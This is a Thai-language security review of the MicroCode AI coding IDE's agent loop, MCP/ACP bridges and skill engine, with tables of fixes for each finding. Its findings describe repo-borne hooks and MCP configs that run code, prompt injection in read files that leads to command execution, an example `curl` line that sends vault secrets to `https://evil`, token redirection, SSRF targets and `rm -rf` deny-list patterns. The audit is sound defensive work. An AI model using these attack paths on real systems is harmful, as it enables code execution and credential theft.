# MicroCode: Research Review ของ AI Agent / Harness / Skills / MCP / ACP

**วันที่:** 2026-11-17 · **Branch:** `codex/agent-autonomy-fixes` (รวม diff ที่ยังไม่ commit) · **ขอบเขต:** โค้ดฝั่ง agent ใน Swift ราว 52K บรรทัด และ Rust backend
**วิธีทำ:** แบ่งรีวิวเป็น 6 ส่วนทำแบบขนาน (Agent loop, Tools/Harness, MCP, ACP, Skills/Rules, Rust backend) แล้วเปิดโค้ดตรวจซ้ำเองทุกข้อที่เป็น Critical/High ข้อที่มีเครื่องหมาย ✅ คือข้อที่ผู้เขียนเปิดโค้ดตรวจด้วยตัวเองแล้ว ส่วนเกณฑ์อ้างอิงคือสเปก MCP 2026-07-28, ACP v1 (สถานะ ณ พ.ย. 2026), agentskills.io และแนวปฏิบัติด้าน harness ของ Anthropic ปี 2025–2026

---

## 0. สรุปสำหรับผู้บริหาร (TL;DR)

ด้านความกว้างของฟีเจอร์ MicroCode ทำได้กว้างกว่า IDE ส่วนใหญ่ในตลาด ทั้ง ACP host/server, MCP 2 ทาง, computer use, sub-agent swarm, skill engine และ local LLM แต่**ความลึกด้านความปลอดภัย ความถูกต้องของ loop และการตามสเปกยังตามหลังความกว้างอยู่มาก**

| ด้าน | สถานะ | เกรด | ปัญหาหลัก |
|---|---|---|---|
| **Security / Workspace trust** | 🔴 | D | แค่เปิด repo ที่ clone มาก็รันโค้ดได้ 3 ทาง (MCP config, hooks, skills) และไม่มี OS sandbox |
| **Agent loop** | 🟠 | C | ตัดสินว่าจะหยุดหรือไม่ด้วย keyword ภาษาไทย/อังกฤษ แทนที่จะดู `stop_reason`, parse tool call จากข้อความแม้ provider จะรองรับ native tool อยู่แล้ว |
| **Tools / Harness** | 🟠 | C | มี tool 44–70 ตัวต่อ turn, plan mode เป็นแค่ prompt, regex deny-list ใช้งานไม่ได้จริง |
| **MCP** | 🟠 | C− | มี 4 implementation, รองรับสเปกถึงแค่ 2025-06-18 ขณะที่ล่าสุดคือ **2026-07-28**, bridge `:18888` ไม่มี auth |
| **ACP** | 🔴 | D+ | ไม่เคยแสดง permission request ให้ผู้ใช้เห็น, Claude/Gemini/Codex ไม่ได้คุยผ่าน ACP จริงแต่เป็น CLI ที่ใส่ `--dangerously-skip-permissions` |
| **Skills / Rules** | 🟠 | C | ออกแบบ progressive disclosure ถูกทาง แต่ไม่มี trust model, core protocol ถูกตัดเหลือครึ่งเดียว |
| **สถาปัตยกรรม** | 🟠 | C | มี agent loop 4 ชุด, MCP server 4 ชุด, `executeIsolatedRunMessage` ยาว 1,860 บรรทัด |
| **Tests / Evals** | 🔴 | F | **มี XCTest target 0 ตัว** และไม่มี eval ของ agent เลย (benchmark ที่มีวัดแค่ประสิทธิภาพ editor) |

**3 เรื่องที่ควรทำก่อนอย่างอื่นทั้งหมด**
1. **Workspace Trust Gate:** ไม่รัน hooks, MCP server, skills, policy หรือ rules ที่มากับ repo จนกว่าผู้ใช้จะกดยืนยัน และ pin hash ของ config ไว้
2. **ปิดช่องโหว่ระดับ P0 ทั้ง 12 ข้อในหัวข้อ 1:** ส่วนใหญ่แก้ได้ในไม่กี่ชั่วโมงถึง 1–2 วัน
3. **ให้ `stop_reason` เป็นตัวตัดสินการจบ turn:** ลบ phrase list และระบบ nag ทิ้ง (ดูข้อ 2.1)

---

## สถานะ Phase 0 (อัปเดต 2026-11-17)

แก้แล้วบน branch `codex/agent-autonomy-fixes` (ยังไม่ commit) โดย Swift build ผ่าน และ `Scripts/tests/run-phase0-security.sh` ผ่าน

| ข้อ | สถานะ | ไฟล์หลัก |
|---|---|---|
| 1.1 / 1.2 MCP config และ hooks จาก repo | ✅ Workspace Trust Gate (pin ด้วย SHA-256 ของ config, ถามครั้งเดียวต่อ fingerprint, โหมด headless ปฏิเสธเสมอ) และ config ระดับผู้ใช้ชนะเมื่อชื่อซ้ำ | `WorkspaceTrustService.swift`, `MultiPlatformRulesEngine.swift` |
| 1.3 / 1.4 Skills | ✅ ห้าม skill จาก repo หรือ `/Volumes` ใช้ id `microcode-*`, project skill ต้อง opt-in, ห้าม shadow built-in, `run_script` ถูกจำกัดให้อยู่ในโฟลเดอร์ skill และต้องเปิดใช้ก่อน, crystallize ห้ามใช้ id ที่สงวนไว้ | `AgentSkillsView.swift` |
| 1.5 `apply_patch` | ✅ ทุก target ต้องผ่าน `validateSandbox` | `AgentToolBox.swift` |
| 1.6 Vault detokenize เข้า shell | ✅ ไม่ detokenize ให้ `shell` อีกแล้ว | `AgentToolBox.swift` |
| 1.7 Bridge `:18888` | ✅ ใช้ token ต่อการเปิดแอปแต่ละครั้ง (`~/.microcode/run/bridge-token`, 0600) และ execute/computer-use จาก MCP client ภายนอกต้องผ่าน approval โดย `mcp-server.py`, `tools/computer_use_engine.py`, `benchmarks/lib_titan_corpus.py` ส่ง token แล้ว | `MCPServer.swift` |
| 1.8 ACP permission | ✅ permission request ถูกส่งไป approval ตาม mode ทั้งใน AIAgentView, Notebook และ SubAgentHarness และตอบด้วย `optionId` ของ agent ✅ bypass flag (`--dangerously-skip-permissions`, `--yolo`, `--force`, `--allow-all-tools`) ส่งเฉพาะ **Full Auto** ส่วน mode อื่นของ CLI ทำงานแบบ read-only: Claude ใช้ `--permission-prompts none` (ตรวจจาก `--help` ก่อน), agy ใช้ `--mode plan`, Gemini/Qwen ไม่ใส่ `--yolo` ส่วน CLI bridge ใน `AIClient` ใช้ YOLO mode ของ MicroCode เป็นตัวตัดสิน และ UI อธิบายพฤติกรรมของแต่ละ mode | `ACPHostService.swift`, `ACPProtocol.swift`, `AIClient.swift` |
| 1.9 Text-parsed tool calls | ✅ Pattern 3 ใช้เฉพาะ `.local` และตัด code fence ออกก่อน, `shell(...)` แบบไม่มี JSON ไม่ถูกรัน, harness action ใช้ workspace ที่ pin ไว้ + เทียบคำทั้งคำ | `AgentService.swift` |
| 1.10 regex `rm -rf` | ✅ แก้ pattern (ทดสอบ 17 เคสด้วย ICU) และ workspace policy เพิ่ม rule ได้อย่างเดียว | `EnterpriseAIAuthService.swift` |
| 1.11 `web_fetch` และโฟลเดอร์ credential | ✅ อนุญาตแค่ http(s), บล็อก metadata/link-local และ `:18888` รวมถึงหลัง redirect, อ่าน `~/.claude` `~/.codex` ฯลฯ ได้เฉพาะ skills/rules/md | `AgentToolBox.swift` |
| 1.12 `microcode-agent` | ✅ ปฏิเสธ handshake (ทดสอบจริง: ไม่มี token → 401, token ถูก → 101), เทียบแบบ constant-time, ตั้ง `AGENT_BIND` ได้ (ค่าเริ่มต้นยังเป็น 0.0.0.0) | `microcode-agent/src/main.rs` |
| Policy ใน repo | ✅ `.microcode/enterprise-policy.json` เข้มงวดขึ้นได้อย่างเดียว | `EnterpriseAIAuthService.swift` |
| `mcp-server.py` จาก workspace | ✅ ใช้ fallback นี้เฉพาะ build แบบ DEBUG | `AgentToolBox.swift` |
| Core protocol ถูกตัดครึ่ง | ✅ inject ครบ และแก้ string ของ self-check | `AgentSkillsView.swift`, `MicroCodeApp.swift` |
| Nag ใน diff ที่ยังไม่ commit | ✔︎ ผู้ใช้ตัดสินใจคงไว้ตามเดิม (nag สูงสุด 4 ครั้ง, keyword trigger ใช้กับทุก provider) | `AgentService.swift` |

## สถานะ Phase 1: Loop correctness (อัปเดต 2026-11-17)

ทำแล้วบน branch เดียวกัน (ยังไม่ commit) และ `Scripts/tests/run-phase1-loop.sh` ผ่าน

| เรื่อง | สิ่งที่เปลี่ยน | ไฟล์ |
|---|---|---|
| Retry หลัง stream ส่งข้อมูลมาแล้วบางส่วน (2.1-3) | AIClient จะไม่ retry เองเมื่อส่ง text หรือ tool call ให้ caller ไปแล้ว (`StreamEmissionTracker`) แต่ให้ agent loop เริ่ม turn ใหม่จาก state ที่สะอาด ส่วนข้อผิดพลาดถาวร (400/invalid request/unknown model) จะไม่ถูก retry 5 รอบ | `AIClient.swift`, `AgentService.swift` |
| Tool JSON เสีย (2.1-4) | Anthropic/OpenAI ส่ง call ที่ args เสียต่อมาพร้อม marker แล้ว `AgentToolBox` คืน error ให้โมเดลส่งใหม่ (ไม่รันด้วย `{}` และไม่หายไปเงียบๆ) ส่วน SSE `error` ของ Anthropic กลายเป็น error จริงแล้ว | `AIClient.swift`, `AgentToolBox.swift` |
| `stop_reason` (2.1-1) | ✅ ส่งต่อมาถึง loop แล้ว (`AIStopReason`: Anthropic/OpenAI/Gemini) ใช้กับ `max_tokens` (ทำต่ออัตโนมัติได้ 2 ครั้ง) และ `refusal` (ไม่ nag) การใช้ `end_turn` แทน keyword nag: **ผู้ใช้เลือกคง nag ไว้ตามเดิม** (2026-11-17) | `AIStreamPrimitives.swift`, `AgentService.swift` |
| Context overflow (2.2) | compact `history` ที่กำลังส่งทันที (2 ระดับ) แทนการไปเช็ก `freed > 500` | `AgentService.swift` |
| Compaction ลืมเป้าหมาย | checkpoint ที่ถูก fold พก objective ปัจจุบันไปแบบ verbatim | `TokenOptimizer.swift` |
| Prompt cache (2.2) | System prompt แบ่งเป็น stable prefix (core + Provider Contract) กับ dynamic context โดย Anthropic วาง cache breakpoint ไว้ที่ prefix (จำนวน breakpoint เท่าเดิม) และการบีบ prompt ไม่ตัด prefix | `AgentService.swift`, `AIClient.swift`, `TokenOptimizer.swift` |
| Workspace ใน system prompt | ใช้ workspace ที่ pin ไว้ต่อ run (background chat ไม่เห็นโปรเจกต์ของ chat อื่น) | `AgentService.swift` |
| Quick wins | ลบตัวเลข 18,420 ที่ไม่ได้มาจากการวัด, memory ผ่าน `AgentPrivacyGuard.sanitize`, `isContinuationRequest` ไม่ตีความ "Build a REST API…" เป็น continuation, dedupe ไม่แตะ code block, เส้นทาง read แบบขนานรัน `pre_tool` hook | หลายไฟล์ |

**ยังไม่ได้ทำใน Phase 1:** แยก `AgentRun` state ต่อ chat (refactor ใหญ่), budget ที่อิง context window จริงของโมเดล, ทำ tool set ให้คงที่เพื่อ cache (เปลี่ยนพฤติกรรม ToolScope), XCTest target + fake-provider test ของ loop ทั้งเส้น

## สถานะ Phase 2a: Protocol correctness (อัปเดต 2026-11-17)

ทำแล้วบน branch เดียวกัน (ยังไม่ commit) และ `Scripts/tests/run-phase2-protocol.sh` ผ่าน

| ส่วน | สิ่งที่เปลี่ยน | ไฟล์ |
|---|---|---|
| MCP server | รับ JSON-RPC id ทั้ง string และ number, ไม่ตอบ notification (HTTP คืน 202), `ping` คืน `{}`, negotiate ได้ถึง **2025-11-25** และรองรับ request แบบ stateless **2026-07-28** (`server/discover`, version ใน `_meta`, `resultType: "complete"`, error -32022 เมื่อไม่รองรับ version), ประกาศ capability ให้ตรงกับที่ทำได้จริง (ไม่มี `logging`/`listChanged` ที่ไม่ได้ทำ), tool annotations (`readOnlyHint`/`destructiveHint`/`openWorldHint`) และเรียง tool แบบ deterministic | `MCPProtocolSupport.swift`, `MCPServer.swift` |
| Bridge HTTP | อ่าน body จนครบตาม Content-Length (เดิมตัดที่ 64 KB) โดยจำกัดไว้ที่ 32 MB | `MCPServer.swift` |
| MCP client | แยก request กับ notification ให้ถูก (`tools/list_changed` refresh ได้แล้ว), ตอบ -32601 ให้ server request ที่ไม่รองรับ, initialize ด้วย 2025-11-25 แล้วส่ง `MCP-Protocol-Version`, timeout ของ HTTP ตาม request, generation id กัน race ตอน restart, ปิด server แบบ stdin EOF → SIGTERM → SIGKILL, ไม่ส่ง `AUTHORIZATION`/`BEARER_TOKEN`/`MCP_TOKEN` จาก env ของแอปให้ทุก server และ server จาก repo ไม่ได้รับ credential จาก env | `ExternalMCPManager.swift` |
| ACP host | ตรวจจับ adapter (`claude-code-acp`, `codex-acp`, `npx @x/y-acp@1.2`), แยก stream ทีละ turn และปิดเมื่อได้ response ของ `session/prompt` (แก้ AIAgentView/SubAgentHarness ค้าง), ตอบ -32601 ให้ request ที่ไม่รู้จัก, เก็บ `agentCapabilities`/`authMethods` และเมื่อต้อง auth จะเรียก `authenticate` ครั้งเดียวแล้วลอง `session/new` ใหม่ | `ACPHostService.swift`, `ACPProtocol.swift` |
| ACP server | stdout มีแต่ข้อความ ACP (protocol ใช้ fd ส่วนตัว และ `print()` ไปที่ stderr), ประกาศ capability ตามจริง (`loadSession`/`image`/MCP http-sse = false), sessionId ที่ไม่รู้จักได้ error, prompt ซ้อนกันได้ error, ชน limit แล้วได้ `max_turn_requests` | `ACPServerService.swift`, `MicroCodeApp.swift` |

**Phase 2b (ยังไม่ทำ):** MCP OAuth 2.1 (PRM, PKCE, Client ID Metadata Documents, `iss`), เก็บ token ใน Keychain และผูกกับ origin, `subscriptions/listen`, Streamable HTTP แบบ GET/SSE เต็มรูปแบบ, ACP: Codable types จาก SDK 1.0, ACP Registry, `usage_update`/`session/list`/`resume`/`close`, `session/load` แบบ replay, ใช้ fs/terminal/permission ของ client ฝั่ง server

---

## 1. P0: ความปลอดภัย (ควรแก้ทันที)

> แกนของปัญหาคือ **ไม่มีแนวคิด "workspace trust"** ไฟล์ config ที่อยู่ใน repo ถูกเชื่อเท่ากับ config ของผู้ใช้เอง และการ์ดหลายตัวเป็นแค่ regex ที่ไม่มี OS sandbox รองรับอยู่ด้านหลัง

| # | ปัญหา | หลักฐาน | การแก้ |
|---|---|---|---|
| 1.1 ✅ | **`.mcp.json` / `.cursor/mcp.json` / `.vscode/mcp.json` ใน repo ถูกรันอัตโนมัติ** ตอน background probe แม้จะตั้ง `autoStart:false` ไว้ และ config ฝั่ง workspace ถูกอ่านก่อน global ทำให้ชนะเมื่อชื่อซ้ำ | `ExternalMCPManager.swift:732-743, 777`; `MultiPlatformRulesEngine.swift:440-444` | ห้าม probe config ระดับ workspace จนกว่าผู้ใช้จะยินยอม และ pin hash ของ (path, command, args, env keys) |
| 1.2 ✅ | **Hooks จาก `<repo>/.claude/settings.json`, `.cursor/hooks.json`, `.microcode/hooks.json` รันด้วย `zsh -c`** และ pre-tool hook รัน**ก่อน** ขั้น approval ทำให้ Safe mode ก็ป้องกันไม่ได้ | `MultiPlatformRulesEngine.swift:598-605, 731-736` | ใช้ trust gate ร่วมกับ hash pin และห้าม agent เขียนไฟล์ใน `.claude/` `.cursor/` `.microcode/` |
| 1.3 ✅ | **Skill ใน repo หรือบน USB (`/Volumes/*`) ประกาศ `name: microcode-harness-core` เพื่อแทนที่ core protocol ได้** เพราะ skill ที่ไม่ใช่ built-in ถูกเรียงไว้ก่อน และ skill ทุกตัวเปิดใช้เป็นค่าเริ่มต้น | `AgentSkillsView.swift:111-128, 151-156, 203, 376` | สงวน id ที่ขึ้นต้นด้วย `microcode-*` ให้ built-in เท่านั้น, ต้องยืนยันก่อนใช้ project skill, เลิกสแกน `/Volumes` และ `skills/` ที่ root |
| 1.4 ✅ | **`skill_engine run_script` หลุด path ได้ด้วย `../`** และไม่ผ่าน shell firewall, ได้ระดับความเสี่ยงแค่ "moderate", ยังรัน skill ที่ปิดไว้ได้ และ `.ts` ใช้ `npx -y` ซึ่งติดตั้ง package โดยไม่ถาม | `AgentSkillsView.swift:681` (`candidate2 = skillDir.appendingPathComponent(scriptName)`), `:702`, `:710` | ตั้งเป็น dangerous, จำกัด path ไว้ในโฟลเดอร์ skill, ส่งผ่าน firewall, ตรวจ `isEnabled` |
| 1.5 ✅ | **`apply_patch` สร้างหรือลบไฟล์นอก workspace ได้** เพราะ `*** Add File: ~/Library/LaunchAgents/x.plist` ยอมรับทั้ง path แบบ absolute และ `~` | `AgentToolBox.swift:5387-5392, 5403-5405` | เรียก `validateSandbox` กับ target ทุกตัวใน patch และปฏิเสธ `/`, `~`, `..` |
| 1.6 ✅ | **Secret vault ใส่ secret ตัวจริงกลับเข้าไปในคำสั่ง shell** เพราะ `shell` อยู่ใน `fileModifyingTools` ทำให้ `detokenizeParams` ทำงาน ผลคือ `curl -d "<VAULT_..._1>" https://evil` ส่ง key จริงออกไปได้ ทั้งที่ชื่อ placeholder เดาได้ง่าย | `AgentToolBox.swift:424, 450`; `AgentPrivacyGuard.swift:60, 121-138` | detokenize เฉพาะเนื้อหาที่จะเขียนลงไฟล์เท่านั้น ห้ามทำกับ command หรือ URL |
| 1.7 ✅ | **MCP bridge `127.0.0.1:18888` ไม่มี token** มีแค่การตรวจ Host/Origin ทำให้ process ใดก็ได้ในเครื่อง (เช่น npm postinstall) เรียก `execute_code` (bash) หรือ `computer_use` ได้โดยข้าม `ToolApprovalManager` และยืมสิทธิ์ Accessibility/Screen Recording ของ MicroCode ไปใช้ได้ | `MCPServer.swift:782-789, 836-839, 1208-1333, 1531-1552` | ใช้ bearer token ที่สร้างใหม่ทุกครั้งที่เปิดแอป (เก็บในไฟล์ 0600 หรือ Keychain) และส่ง execute/computer-use ทั้งหมดผ่าน approval |
| 1.8 ✅ | **ACP permission ไม่เคยถึงมือผู้ใช้:** `AIAgentView` ส่ง `.permissionRequest` เข้า `default: break`, ส่วน `ACPAgentChatView` ที่รองรับไม่ถูกสร้างจากที่ใดเลย, `SubAgentHarness` อนุมัติทุกครั้ง และ `claudeFlag` คืนค่า `"auto"` ในทั้ง 3 mode รวมถึงใส่ `--dangerously-skip-permissions` / `--yolo` / `--force` / `--allow-all-tools` เสมอ | `SubAgentHarness.swift:1751-1752`; `ACPProtocol.swift:344-350`; `ACPHostService.swift:664, 671, 678, 690, 772, 797` | แสดง permission ใน AIAgentView และส่ง flag bypass เฉพาะเมื่อผู้ใช้เลือก `fullAuto` เท่านั้น |
| 1.9 ✅ | **Parse tool call จากข้อความกับทุก provider:** Pattern 3 จับข้อความรูป `toolname(...)` ได้ทุกที่ ส่วน `shell(rm -rf build)` ที่โมเดลแค่ยกมาอ้างหรือคัดลอกมาจากไฟล์ที่อ่านจะถูกรันจริง (prompt injection นำไปสู่ RCE) ใน yolo mode ไม่มีอะไรขวางเลย | `AgentService.swift:2627-2633, 5855-5890, 5972` | parse จากข้อความเฉพาะ provider ที่ไม่มี native tool, เลิกใช้ Pattern 3, บังคับใช้แท็ก `<tool_call>` และตัด code fence ออกก่อน parse |
| 1.10 ✅ | **Shell deny-list ใช้งานไม่ได้จริง:** regex `rm\s+-rf\s+(/\|~\|\$HOME)\b` **ไม่ match `rm -rf /` และ `rm -rf ~`** (ทดสอบแล้ว), `validateSafety` ไม่จับ `rm -r -f ~`, `git clean -xdf`, `git push -f`, `find -exec rm`, มี regex 3 ชุดที่ไม่ตรงกัน และ**ไม่มี OS sandbox** | `EnterpriseAIAuthService.swift:125`; `AgentToolBox.swift:4358-4383`; `MCPServer.swift:170-200` | ใช้ `sandbox-exec` profile แบบเดียวกับ Codex CLI (เขียนได้แค่ workspace และ tmp, ปิด network เป็นค่าเริ่มต้น, ล้าง env) และลดบทบาท regex เหลือแค่คำเตือน |
| 1.11 | **`web_fetch` ไม่ตรวจ scheme หรือ host** จึงอ่าน `file:///...` ได้ และยิงไปที่ `169.254.169.254` หรือ `localhost:18888` (SSRF) ได้ นอกจากนี้ `file_read` อ่าน `~/.claude`, `~/.codex`, `~/.gemini`, `~/.cursor` ได้โดยไม่ต้องขออนุมัติ | `AgentToolBox.swift:5115-5121, 979-987` | อนุญาตแค่ http(s), บล็อก IP ภายในเครือข่าย และถอดโฟลเดอร์ credential ออกจาก allow-list |
| 1.12 ✅ (โค้ด) | **`microcode-agent` bind `0.0.0.0`** และ callback ตอน handshake แค่ตั้ง status 401 แล้ว**คืน `Ok(response)`** ซึ่งตาม tungstenite แปลว่า handshake ยังสำเร็จ เมื่อต่อ WebSocket ได้ก็รันโค้ดผ่าน `python3 -c` ได้ ส่วน token เทียบแบบไม่ constant-time และถูก print ออก stdout | `microcode-agent/src/main.rs:14, 37-53`; `executor.rs:31` | คืน `Err(ErrorResponse)`, bind 127.0.0.1 เป็นค่าเริ่มต้น, เทียบแบบ constant-time *(ควรเขียน test เพื่อยืนยันว่าโจมตีได้จริง)* |

**ข้ออื่นที่ควรแก้ในรอบเดียวกัน**
- `<repo>/.microcode/enterprise-policy.json` **ปิด firewall และ secret redaction ได้เอง** (`EnterpriseAIAuthService.swift:780-797`)
- `mcp-server.py` มี `ALLOWED_PATHS` ที่ครอบ `~/.gemini`, `~/.codex`, `/Volumes` ทำให้เขียน `mcpServers` ลงใน config ของ tool อื่นเพื่อฝังตัวถาวรได้ (`mcp-server.py:50-58`)
- MCP bearer token ผูกกับ**ชื่อ** server แทนที่จะผูกกับ origin ถ้า `.mcp.json` ใน repo ประกาศ `"github": {"url": "https://evil"}` token GitHub ของผู้ใช้จะถูกส่งไปที่ evil (`ExternalMCPManager.swift:430-443`) นอกจากนี้ token ยังเก็บใน UserDefaults และ `~/.microcode/mcp.json` แบบ plaintext โดยไม่ได้ตั้งสิทธิ์ 0600
- Computer use ไม่บล็อก Terminal/iTerm และไม่ตรวจช่อง secure text field ส่วนโค้ดใหม่ (ยังไม่ commit) ที่สั่ง action ผ่าน snapshot ref (`@<id>:eN`) ทำงานก่อนการตรวจ deny-list (`NativeComputerUseService.swift:57-82, 1176-1201`; `AgentDesktopBridge.swift:471-484`)
- `AgentDesktopBridge` เรียก `dlopen` จาก path แบบ relative โดยไม่ตรวจลายเซ็น และ OCR รัน `pip install` โดยไม่ pin เวอร์ชัน (`AgentDesktopBridge.swift:213-233`; `OpenThaiOCREngine.swift:141-144`)
- `@import` ใน CLAUDE.md/AGENTS.md ตาม symlink ออกไปนอก repo ได้ (เช่นไปที่ `~/.aws/credentials`) และไม่ผ่าน secret sanitizer (`MultiPlatformRulesEngine.swift:580-583`)
- `AgentContextProtocolBridge` เปิดให้ `@file:/abs/path` อ่าน `~/.ssh` แล้วส่งเข้า cloud prompt ได้ (`AgentContextProtocolBridge.swift:233`)
- Gemini API key ถูกใส่ไว้ใน URL query ในหลายจุด (`ai.rs:98, 249`; `ACPGhostTextBridge.swift:428`) เมื่อ reqwest error คืน URL กลับมาที่ client key ก็หลุดตามไปด้วย

---

## 2. AI Agent Loop

**Flow ปัจจุบัน:** `startOrEnqueueMessage` (`AgentService.swift:1820`) → `runMessage` → **`executeIsolatedRunMessage` (:2001–3860) ยาวราว 1,860 บรรทัดและมี flag แบบ mutable ราว 25 ตัว** → `while` loop ที่ stream ผ่าน `AIClient` → นำ native tool call มารวมกับ tool call ที่ parse จากข้อความ → ถ้าไม่มี tool call จะเข้า heuristic block → ถ้ามีจะรัน tool (read รันขนาน ส่วนที่เหลือรันทีละตัว) → ต่อท้ายทุก tool result ด้วย "Kernel directive"

### 2.1 ปัญหาหลัก (High)

1. **ตัดสินว่า "จบหรือยัง" ด้วย keyword ไม่ได้ใช้ `stop_reason`**
   - AIClient ไม่ส่ง `stop_reason` หรือ `finish_reason` ขึ้นมาถึง AgentService เลย
   - ตัวตัดสินจริงคือ phrase list ภาษาไทย/อังกฤษ ได้แก่ `containsUnfinishedActionIntention` (:3900), `containsNativeWorkCommitment` (:4200) และ `requestRequiresNativeExecution` (:4129) ซึ่งเทียบ substring คำว่า "run"/"test" จึง match คำอย่าง "truncate" หรือ "latest" ด้วย
   - เมื่อ heuristic ทำงาน ระบบจะแทรกข้อความ "CRITICAL… RIGHT NOW" สูงสุด 4 ครั้ง (:2981-3040)
   - **diff ที่ยังไม่ commit ทำให้แย่ลง:** เพิ่ม nag จาก 3 เป็น 4 ครั้ง, ให้ `hasUnfinishedIntent` นับแม้รัน tool ไปแล้ว และผ่อนตัวตัด repetition ลง ขณะที่ comment ที่ :2796 เองก็ยอมรับว่าสัญญาณนี้คือ "the source of runaway agent loops"
   - **แก้:** จบ turn เมื่อได้ `end_turn`/`stop` และไม่มี tool call, จัดการ `max_tokens`/`length` ให้ชัด และเหลือ deterministic gate ไว้แค่ข้อเดียว (เช่น "ผู้ใช้สั่งให้แก้ไฟล์แต่ไม่มีไฟล์ใดเปลี่ยน") โดยให้ nag ได้ไม่เกิน 1 ครั้ง

2. **Harness รันคำสั่งเองจาก keyword:** `inferredWorkspaceAction` (:4285 ✅) เลือก `.test` เมื่อเจอคำว่า "test" หรือ `.run` เมื่อเจอ "run" หรือ "start" ซึ่ง match คำอย่าง "restart" หรือ "latest" ด้วย นอกจากนี้ยังใช้ `toolBox.workspaceRoot` แบบ global แทน workspace ที่ pin ไว้ให้ run นั้น ถ้าผู้ใช้สลับโปรเจกต์ระหว่างที่ agent ทำงาน คำสั่งจะไปรันผิด repo และ URL ของ preview ก็ hardcode เป็น `localhost:5173`

3. **Retry หลัง stream ส่งข้อมูลมาแล้วบางส่วน ทำให้ tool call ถูกเรียกซ้ำ:** AIClient retry ที่ :2035-2174 ทั้งที่ `onToolCall` ได้ append call ไปแล้ว ทำให้ tool ที่แก้ไฟล์อาจถูกรัน 2 ครั้ง และมี retry ซ้อนกัน 3 ชั้น (AIClient, AgentService ที่ทำได้ 8 ครั้ง และ failover) รวมได้ราว 36 request ต่อ turn ส่วน 400 ที่ไม่ใช่ transient ก็ยังถูก retry 5 ครั้ง

4. **Tool JSON ที่เสียหรือถูกตัดกลางทาง:** ฝั่ง Anthropic แปลง `partial_json` ที่ parse ไม่ได้เป็น `[:]` แล้ว**รันต่อ** ทำให้ `file_write` ทำงานด้วย args ว่าง (AIClient :5773) ฝั่ง OpenAI ทิ้ง call นั้นไปเงียบๆ (:5308) และ SSE event `error` เช่น `overloaded_error` ตกไปที่ `default: break` (:5804)
   **แก้:** คืน `tool_result` ที่มี `is_error` พร้อมบอกว่า "arguments truncated, re-emit smaller"

5. **State แบบ global ถูกใช้ร่วมกันระหว่างหลาย chat ที่รันพร้อมกัน:** `filesModified`, `agentPhase`, `isCancelled`, `executionID` ฯลฯ เป็น `@Published` ชุดเดียว (:153-162) เมื่อเริ่ม chat B จะ reset `filesModified` ของ chat A ไปด้วย (:1840) และ `buildSystemPrompt` อ่าน `activeChatId`/`editorContext` หลัง await ทำให้ background run ได้ memory ของ chat อื่นไป
   **แก้:** แยก state ต่อ run ออกมาเป็น `AgentRun` actor

### 2.2 Context engineering และ prompt caching

- **Prompt cache แทบไม่ได้ใช้ข้าม turn:** การวาง `cache_control` ถูกต้องแล้ว (system, tool ตัวสุดท้าย, user 2 ข้อความล่าสุด) แต่สิ่งเหล่านี้ทำให้ cache ไม่ hit
  - (ก) tool array ถูก filter ใหม่ทุก prompt (ToolScope) และเปลี่ยนกลาง turn
  - (ข) system prompt มีของที่เปลี่ยนทุกครั้งต่อท้าย เช่น memory recall, cursor line, LSP diagnostics, skill ที่ rank ใหม่ทุกข้อความ และ swarm blackboard แล้วยังโดนตัดแบบ head/tail อีกรอบ (`TokenOptimizer.swift:253`)
  - (ค) แทรก directive ในทุก tool-result turn
  - **แก้:** ทำ tool set ให้คงที่ (หรือใช้ tool search / `defer_loading`), ให้ system block ส่วน static ขึ้นก่อน แล้วย้ายส่วน dynamic ไปไว้ใน block หลังหรือใน user message *(สเปก MCP 2026-07-28 ก็เพิ่มข้อกำหนดให้ server เรียง `tools/list` แบบ deterministic เพื่อ cache โดยเฉพาะ)*
- **Budget ไม่ขึ้นกับโมเดล:** ค่าถูกตายตัวไว้ที่ 160K/200K (`TokenOptimizer.swift:24-35`) ไม่ว่าจะใช้โมเดล 32K หรือ 2M
- **ไม่สามารถกู้จาก context overflow:** หลังเกิด overflow ระบบ prune ข้อความใน UI ไม่ใช่ `history` ที่กำลังส่ง แล้วไปเช็กเงื่อนไข `freed > 500` ซึ่งปกติจะเป็นราว 0 ผลคือ turn จบแบบ fatal (:2672)
- **Compaction ผิดเป้า:** `TokenOptimizer.swift:907-927` เก็บ `history[0]` ไว้ในฐานะ "primary goal" ทั้งที่มันคือข้อความที่**เก่าที่สุด** ส่วนคำขอปัจจุบันอาจถูกย่อเหลือ 2 ประโยค นอกจากนี้ `deduplicateRepetitiveLines` ยังลบบรรทัด `}` ที่ซ้ำกัน ทำให้โค้ดใน history เสีย
  **แก้:** ทำ structured summary (goal, files touched, decisions, todo) โดยให้ LLM เป็นคนสรุป และ pin objective ปัจจุบันไว้ทุกครั้ง
- **Turn ก่อนหน้าเหลือแค่ชื่อ tool และสถานะ** (`[Executed MicroCode Tools: …]`, :4608) โมเดลจึงต้องอ่านไฟล์ใหม่ทุก turn
- **Token Shield เขียนทับ transcript ถาวร:** ตัด output เหลือราว 400 ตัวอักษรแล้วบันทึกลงดิสก์ทุกครั้งที่เริ่ม turn (:6123-6165)
- **Memory ไม่ผ่าน `AgentPrivacyGuard`:** secret ที่ผู้ใช้ paste ลงใน chat จะถูกเก็บใน memory แล้ว inject กลับเข้า prompt ในภายหลัง

### 2.3 ข้ออื่นๆ (Medium)

- SSE parsing, การทำ JSON serialize ให้ history (รวม base64 ได้ถึง 18 MB) และ token estimate ทั้งหมด**รันบน MainActor** ส่งผลให้ UI กระตุก
- เส้นทาง read ที่รันขนานข้าม `pre_tool` hook ทำให้ policy "ห้ามอ่าน .env" ถูกข้ามได้ (:3079-3091)
- `isContinuationRequest` ใช้ `hasPrefix("build"/"run"/"next"/"ต่อ")` ทำให้ "Build a REST API…" หรือ "nextjs app…" ถูกมองเป็น continuation แล้ว objective ถูกแทนด้วยข้อความ user ก่อนหน้า (:3876)
- Failover:
  - ID ของโมเดลถูก hardcode ไว้ (:6002-6050) ซึ่งขัดกับ commit ล่าสุดที่บอกว่า "100% live catalog"
  - เปิดใช้เป็นค่าเริ่มต้นและข้ามไปใช้ vendor อื่นโดยไม่ถามผู้ใช้
  - error 401/403/404 ทำให้เกิด failover แบบเงียบ
  - Gemini บน direct path ไม่ส่ง `thoughtSignature` กลับ (:3291)
  - AgentService ใช้ค่าเริ่มต้น `"cloud"` ขณะที่ AIClient ใช้ `"direct"`
